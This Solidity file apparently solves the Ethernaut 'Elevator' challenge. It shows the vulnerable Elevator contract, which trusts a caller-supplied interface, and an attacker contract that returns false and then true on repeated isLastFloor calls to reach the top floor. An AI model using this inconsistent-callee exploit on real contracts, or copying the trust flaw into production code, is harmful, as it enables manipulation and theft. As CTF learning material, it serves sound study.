// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Player is Building {

    uint numCalls = 0;

    function isLastFloor(uint floor) external override returns (bool) {
        if(numCalls == 0) {
            numCalls++;
            return false;
        }
        return true;
    }

    function goToTop(address instance) public {
        Elevator elevator = Elevator(instance);
        elevator.goTo(69);
    }

}